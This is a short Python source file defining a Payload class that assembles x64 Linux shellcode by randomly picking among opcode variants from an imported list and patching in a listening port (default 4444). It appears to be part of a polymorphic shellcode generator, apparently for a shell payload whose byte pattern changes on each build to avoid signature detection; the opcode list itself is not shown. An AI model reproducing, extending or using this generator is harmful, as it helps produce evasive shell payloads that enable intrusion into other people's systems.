from opcodes import permut_list
from random import randint
from utils import convert_port_to_little_endian

class Payload:
    def __init__(self,platform,port=4444):
        self.shellcode = ""
        self.platform = platform
        self.arch = "x64"
        self.target_port = port

    def __str__(self):
        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nPort: {self.target_port} \nShellcode:\n{self.shellcode}"

    def permut(self):
        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_little_endian(self.target_port)) # Weird trick for the moment to swap the port (to change)
        if self.platform == "Linux":
            for line in permut_list:
                    self.shellcode += line[randint(0,len(line)-1)]

    def get_bytes_size(self):
        return self.shellcode.count(r"\x")